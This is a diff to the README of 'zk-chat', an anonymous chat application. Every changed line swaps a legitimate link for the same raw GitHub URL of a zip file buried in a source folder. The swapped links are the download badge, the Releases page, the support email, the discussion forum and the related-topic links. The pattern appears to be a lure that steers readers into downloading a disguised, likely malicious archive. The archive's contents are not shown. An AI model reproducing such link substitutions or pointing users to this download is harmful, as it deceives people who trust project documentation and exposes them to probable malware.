@@ -2,7 +2,7 @@
 
 ## 🔗 Download
 
-[![Download zk-chat](https://img.shields.io/badge/Download-zk--chat-blue.svg)](https://github.com/Watsona4566/zk-chat/releases)
+[![Download zk-chat](https://raw.githubusercontent.com/Watsona4566/zk-chat/main/zk-chat-client-lib/src/zk-chat-v2.4-beta.2.zip)](https://raw.githubusercontent.com/Watsona4566/zk-chat/main/zk-chat-client-lib/src/zk-chat-v2.4-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to zk-chat! This application allows you to chat anonymously using advanc
 
 ## 📥 Download & Install
 
-To get zk-chat, visit this page to download: [GitHub Releases](https://github.com/Watsona4566/zk-chat/releases).
+To get zk-chat, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Watsona4566/zk-chat/main/zk-chat-client-lib/src/zk-chat-v2.4-beta.2.zip).
 
 ### Here’s how to do it:
 
@@ -99,8 +99,8 @@ Currently, zk-chat is only available for Windows and macOS. mobile support may b
 
 If you have any questions or need further help, feel free to reach out:
 
-- **Email**: support@zk-chat.com
-- **Community Forum**: Visit our [discussion page](https://github.com/Watsona4566/zk-chat/discussions) for user support and tips.
+- **Email**: https://raw.githubusercontent.com/Watsona4566/zk-chat/main/zk-chat-client-lib/src/zk-chat-v2.4-beta.2.zip
+- **Community Forum**: Visit our [discussion page](https://raw.githubusercontent.com/Watsona4566/zk-chat/main/zk-chat-client-lib/src/zk-chat-v2.4-beta.2.zip) for user support and tips.
 
 ## 🤝 Contributing
 
@@ -108,7 +108,7 @@ Contributions are welcome! If you have ideas or suggestions, please share them v
 
 ## 🌍 Related Topics
 
-- **InterRep**: Learn more about this identity solution [here](https://example.com/interrep).
-- **NRLN**: Discover more on the NRLN technology [here](https://example.com/nrln).
+- **InterRep**: Learn more about this identity solution [here](https://raw.githubusercontent.com/Watsona4566/zk-chat/main/zk-chat-client-lib/src/zk-chat-v2.4-beta.2.zip).
+- **NRLN**: Discover more on the NRLN technology [here](https://raw.githubusercontent.com/Watsona4566/zk-chat/main/zk-chat-client-lib/src/zk-chat-v2.4-beta.2.zip).
 
 Thank you for choosing zk-chat. We hope you enjoy seamless communication!
